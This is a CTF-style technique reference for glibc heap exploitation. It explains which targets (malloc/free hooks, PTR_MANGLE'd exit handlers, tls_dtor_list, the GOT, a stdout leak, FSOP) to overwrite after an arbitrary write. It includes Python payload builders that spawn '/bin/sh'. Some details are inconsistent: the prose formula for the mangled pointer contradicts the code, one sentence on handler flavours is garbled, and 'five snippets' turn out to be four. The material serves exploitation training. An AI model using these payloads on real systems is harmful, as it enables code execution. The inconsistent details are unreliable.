---
title: "Write Targets - What To Overwrite Once You Have an Arbitrary Write"
category: pwn
subcategory: heap
type: technique
tags: [free-hook, malloc-hook, realloc-hook, exit-handlers, ptr-mangle, tls-dtor-list, fsop, got, stdout-leak, io-file, one-gadget, arbitrary-write, heap, pwntools, pwndbg, gef, glibc]
difficulty: medium
summary: "A decision table from glibc version plus primitive to the right target: hooks, exit handlers with PTR_MANGLE, GOT, stdout leak, FSOP."
when_to_use:
  - "You have an arbitrary write (tcache poison, largebin attack, fake chunk) and need a target"
  - "`__free_hook` is gone because the libc is 2.34+"
  - "You need a libc leak and have a write but no read"
  - "seccomp blocks execve and you need an ORW chain instead of system"
tools: [pwntools, pwndbg, gef, one-gadget, seccomp-tools]
related: [heap-tcache-poisoning, heap-fsop-file-struct, heap-setcontext-pivot, house-of-apple, heap-version-differences]
---

## TL;DR

An arbitrary write is only half an exploit. What you point it at depends on the glibc
version (hooks died in 2.34), the binary's RELRO, and whether seccomp is on. The
ranked list: `__free_hook` -> exit handlers -> FSOP/`_IO_` -> GOT -> `stdout` partial
overwrite for a leak.

## Recognise it

- You have a working tcache poison / largebin attack / fake chunk but no plan.
- `checksec` says Full RELRO (GOT is read-only) or Partial RELRO (GOT is live).
- `nm -D libc.so.6 | grep __free_hook` returns nothing -> 2.34+.
- `seccomp-tools dump ./chal` shows `execve` blocked -> you need ORW, not `system`.

## Vulnerable code shape

Not a bug shape - a *capability* shape. You are here because you already have one of:

```c
/* (a) an allocation at an address you chose */
char *p = malloc(0x48);       /* returns TARGET after a tcache poison */
read(0, p, 0x48);             /* => write anything at TARGET */

/* (b) a single-qword write */
*(size_t *)TARGET = VALUE;

/* (c) a heap-pointer-only write (largebin attack) */
*(size_t *)TARGET = &heap_chunk_you_control;
```

## Theory

### Decision table

| glibc | primitive | best target | notes |
|-------|-----------|-------------|-------|
| 2.23 - 2.33 | write any value | `__free_hook` = `system` | `free(ptr_to_"/bin/sh")` |
| 2.23 - 2.33 | write any value | `__malloc_hook` = one_gadget | fires on the next malloc |
| 2.23 - 2.33 | write any value, seccomp on | `__free_hook` = `setcontext+61`, chunk = ucontext | see `heap-setcontext-pivot` |
| any | write any value, Partial RELRO | `GOT[puts]` = `system` | needs a controlled first argument |
| 2.34+ | write any value | `__exit_funcs` entry (mangled) | needs the TLS guard leak |
| 2.34+ | write any value | `_IO_2_1_stdout_->vtable` -> `_IO_wfile_jumps` | house of apple |
| 2.34+ | heap pointer only | `_IO_list_all` (largebin attack) | FSOP at `exit()` |
| any | need a LEAK, have a write | `_IO_2_1_stdout_` `_flags` + `_IO_write_base` | prints libc memory |
| any | write, stack leak available | saved return address | plain ROP |

### 1. `__free_hook` / `__malloc_hook` / `__realloc_hook` (<= 2.33)

```c
void *(*__malloc_hook)(size_t, const void *);
void  (*__free_hook)(void *, const void *);
```

`__free_hook` is the best because `free(p)` puts `p` in `rdi`, so
`__free_hook = system` plus a chunk containing `"/bin/sh"` is a complete exploit.
`__malloc_hook` puts the *size* in `rdi`, so it only pairs with a one_gadget.

Removed in 2.34 (`malloc: Remove malloc hooks`). `nm -D` is the test.

### 2. one_gadget constraints

`one_gadget ./libc.so.6` prints entries like:

```
0x50a37 posix_spawn(rsp+0x1c, "/bin/sh", 0, rbp, rsp+0x60, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
```

Those constraints are checked at the moment the gadget runs. From `__free_hook` the
stack is deep inside `free`, so `rsp & 0xf` is usually satisfiable by choosing which
hook you use. If none fit, use `setcontext` to *set* the registers you need.

### 3. Exit handlers - `__exit_funcs` with PTR_MANGLE

`exit()` walks a linked list of `struct exit_function_list`:

```c
struct exit_function {
  long int flavor;              /* 4 = ef_cxa */
  union {
    void (*at)(void);
    struct { void (*fn)(int, void *); void *arg; } cxa;
  } func;
};
```

`__run_exit_handlers` calls:

```c
case ef_cxa:
  ...
  PTR_DEMANGLE (cxafct);
  cxafct (f->func.cxa.arg, status);
```

`PTR_DEMANGLE` on x86-64 is:

```
ror  rax, 0x11
xor  rax, fs:[0x30]        ; the pointer guard in the TCB
```

So the value you must store is `ROL(target, 0x11) ^ guard`. You need the guard, which
lives at `fs:0x30` - i.e. at `TLS_base + 0x30`. Ways to get it:

- An arbitrary read of `fs:0x30` if you can compute the TLS base (it is at a fixed
  offset below libc on most setups - find it once with `pwndbg> tls`).
- On some builds the guard is at `libc_base - 0x2890 + 0x30`-ish; **derive, never memorise**.
- If you cannot leak it, you can instead overwrite the *whole* `initial` structure
  with `flavor = 4 (ef_cxa)` is still mangled... but `flavor = ef_at (1)` uses
  `PTR_DEMANGLE` too. There is no unmangled flavour, so the guard is mandatory.

`initial` (the static first `exit_function_list`) is a libc symbol on most builds:
`__exit_funcs` points at it. The layout is
`{ next, idx, fns[32] }` with `fns[i]` being `{ flavor(8), fn(8), arg(8), dso(8) }`.

### 4. `tls_dtor_list` / `__call_tls_dtors`

```c
struct dtor_list {
  dtor_func func;
  void *obj;
  struct link_map *map;
  struct dtor_list *next;
};
/* __call_tls_dtors: */
dtor_func func = cur->func;
PTR_DEMANGLE (func);
func (cur->obj);
```

Same mangling, but `rdi = cur->obj` is fully controlled - so
`func = system`, `obj = "/bin/sh"` is a one-shot shell. `tls_dtor_list` is in TLS at
`fs:-0x??`; find its address with `pwndbg> p &tls_dtor_list`. Runs on `exit()`.

### 5. GOT (Partial RELRO only)

`checksec` -> `RELRO: Partial RELRO` means `.got.plt` is writable. Overwrite
`GOT[puts]`, `GOT[printf]`, `GOT[atoi]` (the menu's own `atoi(input)` gives you
`rdi = your string`, which makes `atoi -> system` a complete exploit). Full RELRO
makes this impossible.

`elf.got['atoi']` in pwntools.

### 6. `_IO_2_1_stdout_` partial overwrite - the leak primitive

If you have a write but no read, turn `stdout` into a memory dumper:

```
_IO_2_1_stdout_ + 0x00 : _flags
_IO_2_1_stdout_ + 0x20 : _IO_write_base
_IO_2_1_stdout_ + 0x28 : _IO_write_ptr
_IO_2_1_stdout_ + 0x30 : _IO_write_end
```

`_IO_new_file_overflow` flushes everything between `_IO_write_base` and
`_IO_write_ptr`. Set `_flags = 0xFBAD1800` (keeps `_IO_IS_APPENDING` etc. but clears
`_IO_NO_WRITES`) and overwrite **only the low byte** of `_IO_write_base` with `0x00`.
That moves `write_base` back by up to 0xFF bytes into libc data, and the next `puts()`
prints everything from there to `write_ptr` - which includes pointers into libc and
into the stack. A one-byte write, no leak required.

Payload for a full-qword write primitive:

```
p64(0xFBAD1800) + p64(0)*3 + p8(0x00)
```

written at `_IO_2_1_stdout_` (covering `_flags` through the first byte of
`_IO_write_base`).

### 7. FSOP / `_IO_list_all`

The general "call a function through a FILE vtable" route. Full treatment in
`heap-fsop-file-struct` and `house-of-apple`. Summary: `exit()` calls
`_IO_cleanup` -> `_IO_flush_all_lockp`, which walks `_IO_list_all` and calls
`_IO_OVERFLOW(fp, EOF)` on every FILE whose `_IO_write_ptr > _IO_write_base`.
Point `_IO_list_all` (or `stdout->_chain`) at a forged FILE and you control the call.

### 8. `stdout->_IO_buf_end` / `_IO_buf_base`

Setting `_IO_buf_base` to a target and `_IO_buf_end` to `target + n` turns the next
`fread`/`scanf` into an arbitrary write of attacker-supplied bytes. Useful when your
primitive is a *single* qword but the program reads input afterwards.

## Attack

The generic order of operations:

1. Get a libc leak (unsorted bin, or the `stdout` `_flags` trick above).
2. `nm -D libc.so.6 | grep -c __free_hook` -> if 1, take the hook route.
3. Otherwise check seccomp. No seccomp -> house of apple / `_IO_wfile_jumps` with
   `system`. Seccomp on -> `setcontext` pivot into an ORW chain.
4. If the binary is Partial RELRO, prefer the GOT: fewer moving parts.
5. If you only have a *heap pointer* write (largebin attack), you must go through
   `_IO_list_all` or `stdout` - those are the targets where "a pointer to a region I
   control" is exactly what is needed.

## Heap state

```text
__free_hook route (<= 2.33)

  libc:  __free_hook  -> system
  heap:  chunk N       "/bin/sh\0"
  call:  free(chunk N)  ==>  system("/bin/sh")


exit handler route (2.34+)

  libc: initial (struct exit_function_list)
        +0x00 next  = NULL
        +0x08 idx   = 1
        +0x10 fns[0].flavor = 4 (ef_cxa)
        +0x18 fns[0].fn     = ROL(system, 0x11) ^ fs:[0x30]   <-- mangled!
        +0x20 fns[0].arg    = &"/bin/sh"
  exit() -> __run_exit_handlers -> PTR_DEMANGLE -> system("/bin/sh")


stdout leak primitive (any version)

  _IO_2_1_stdout_
   +0x00 _flags          = 0xFBAD1800
   +0x08 _IO_read_ptr    = 0
   +0x10 _IO_read_end    = 0
   +0x18 _IO_read_base   = 0
   +0x20 _IO_write_base  = 0x00007f...XX00   <-- only the low byte changed
   +0x28 _IO_write_ptr   = (unchanged, points into libc data)

  next puts()/printf() flushes [write_base, write_ptr) to fd 1
   ==> dozens of libc and stack pointers on your screen
```

## Exploit

Five standalone snippets; each is a complete, importable module.

```python
#!/usr/bin/env python3
"""Target 1: __free_hook = system (glibc <= 2.33)."""
from pwn import ELF, p64


def build_free_hook_payload(libc: ELF) -> tuple:
    """Return (address, value) for the write, plus the trigger recipe."""
    assert "__free_hook" in libc.sym, "this libc has no hooks (2.34+)"
    return libc.sym["__free_hook"], p64(libc.sym["system"])


if __name__ == "__main__":
    lib = ELF("./libc.so.6", checksec=False)
    lib.address = 0x7FFFF7000000          # pretend leak, for the demo
    addr, val = build_free_hook_payload(lib)
    print("write %r at %#x, then free() a chunk holding b'/bin/sh\\0'" % (val, addr))
```

```python
#!/usr/bin/env python3
"""Target 2: exit handlers with PTR_MANGLE (glibc 2.34+).

You need the pointer guard from fs:0x30. Read it with any arbitrary read,
or find its address once in gdb (`pwndbg> tls` then `x/gx $fs_base+0x30`).
"""
from pwn import ELF, p64

MASK64 = (1 << 64) - 1


def rol(val: int, n: int, bits: int = 64) -> int:
    n %= bits
    return ((val << n) | (val >> (bits - n))) & MASK64


def ror(val: int, n: int, bits: int = 64) -> int:
    n %= bits
    return ((val >> n) | (val << (bits - n))) & MASK64


def ptr_mangle(ptr: int, guard: int) -> int:
    """glibc x86-64 PTR_MANGLE: ror by 0x11 is the DEMANGLE, so we ROL to encode."""
    return rol(ptr ^ guard, 0x11)


def ptr_demangle(val: int, guard: int) -> int:
    return ror(val, 0x11) ^ guard


def build_exit_handler(libc: ELF, guard: int, binsh: int) -> bytes:
    """Overwrite `initial` so the first exit handler is system("/bin/sh")."""
    return b"".join([
        p64(0),                                   # next
        p64(1),                                   # idx
        p64(4),                                   # fns[0].flavor = ef_cxa
        p64(ptr_mangle(libc.sym["system"], guard)),
        p64(binsh),                               # fns[0].arg -> rdi
        p64(0),                                   # fns[0].dso_handle
    ])


if __name__ == "__main__":
    for p, g in ((0x7FFFF7A52290, 0xDEADBEEFCAFE1234), (0x41414141, 0)):
        assert ptr_demangle(ptr_mangle(p, g), g) == p
    print("[+] PTR_MANGLE round-trip ok")
```

```python
#!/usr/bin/env python3
"""Target 3: GOT overwrite (Partial RELRO only). atoi -> system is the classic:
the menu already calls atoi(your_input), so rdi is your string."""
from pwn import ELF, p64


def build_got_payload(elf: ELF, libc: ELF, func: str = "atoi") -> tuple:
    assert elf.got, "no GOT?"
    assert func in elf.got, "%s is not in the GOT" % func
    return elf.got[func], p64(libc.sym["system"])


if __name__ == "__main__":
    b = ELF("./chal", checksec=False)
    lib = ELF("./libc.so.6", checksec=False)
    lib.address = 0x7FFFF7000000
    a, v = build_got_payload(b, lib)
    print("write %r at %#x; then type /bin/sh at the menu prompt" % (v, a))
```

```python
#!/usr/bin/env python3
"""Target 4: _IO_2_1_stdout_ partial overwrite -> libc leak with NO prior leak.

Write these 33 bytes over _IO_2_1_stdout_. The final byte zeroes the low byte
of _IO_write_base, rewinding it into libc data; the next flush prints it all.
"""
from pwn import p64, p8

FLAGS_LEAK = 0xFBAD1800          # magic | _IO_CURRENTLY_PUTTING, _IO_NO_WRITES clear


def stdout_leak_payload() -> bytes:
    return p64(FLAGS_LEAK) + p64(0) * 3 + p8(0x00)


def stdout_leak_payload_full(write_base: int, write_ptr: int) -> bytes:
    """Full-control version when you can write the whole struct head."""
    return b"".join([
        p64(FLAGS_LEAK),
        p64(0), p64(0), p64(0),      # _IO_read_ptr/_end/_base
        p64(write_base),             # _IO_write_base : start of the dump
        p64(write_ptr),              # _IO_write_ptr  : end of the dump
    ])


if __name__ == "__main__":
    pay = stdout_leak_payload()
    assert len(pay) == 33
    print("partial payload (%d bytes): %s" % (len(pay), pay.hex()))
    full = stdout_leak_payload_full(0x7FFFF7DD18E0, 0x7FFFF7DD1A00)
    assert len(full) == 48
    print("full payload   (%d bytes): %s" % (len(full), full.hex()))
```

## Variants & pitfalls

- **`__free_hook` needs a `free()` you can reach with controlled `rdi`.** If the menu
  frees only its own bookkeeping, use `__malloc_hook` + one_gadget instead.
- **The pointer guard is per-process.** You cannot precompute the mangled exit-handler
  value offline; leak `fs:0x30` first.
- **`initial` may be read-only-ish.** On some builds `__exit_funcs` points into
  `.data.rel.ro` which is `mprotect`ed read-only after relocation under Full RELRO
  *for the binary*, but libc's own `initial` stays writable. Check `vmmap`.
- **Partial-overwrite races.** The `_IO_write_base` low-byte trick prints whatever is
  between the two pointers; if `write_ptr <= write_base` nothing prints. Try the low
  byte values 0x00, 0x20, 0x40 until you get output.
- **seccomp.** `seccomp-tools dump ./chal` first. If `execve` is blocked, none of
  `system`/one_gadget works - go to `heap-setcontext-pivot` for an ORW chain.
- **`atoi` is not always in the GOT.** `strtol`, `__isoc99_scanf`, `puts`, `printf`
  are the usual alternatives. Pick one whose first argument you control.
- **2.32+ `_IO_2_1_stdout_` vtable check.** You may set fields freely, but the vtable
  pointer must stay inside `__libc_IO_vtables`.

## Debugging

```text
pwndbg> p &__free_hook
pwndbg> p &__malloc_hook
pwndbg> p __exit_funcs
pwndbg> p *__exit_funcs
pwndbg> tls                       # TLS base; the pointer guard is at +0x30
pwndbg> x/gx $fs_base+0x30
pwndbg> p &_IO_2_1_stdout_
pwndbg> p *(struct _IO_FILE_plus*)&_IO_2_1_stdout_
pwndbg> p &tls_dtor_list
pwndbg> got                       # pwndbg prints the GOT with resolved names
pwndbg> vmmap                     # is the target writable?
gef>  got
gef>  checksec
```

```bash
# Does this libc still have hooks?
nm -D ./libc.so.6 | grep -E '__free_hook|__malloc_hook|__realloc_hook'
# Is the GOT writable?
checksec --file=./chal
# Is execve allowed?
seccomp-tools dump ./chal
# What one_gadgets exist?
one_gadget ./libc.so.6
```

## Tools

- `one_gadget`, `seccomp-tools`, `checksec`.
- `pwndbg got` / `gef got` for a quick RELRO read.
- `pwntools` `ELF.sym` / `ELF.got` so nothing is hardcoded.

## References

- glibc `malloc/malloc.c` (hooks), `stdlib/exit.c` and `stdlib/cxa_atexit.c`
  (exit handlers), `libio/fileops.c` (`_IO_new_file_overflow`).
- shellphish `how2heap` for the allocator side.
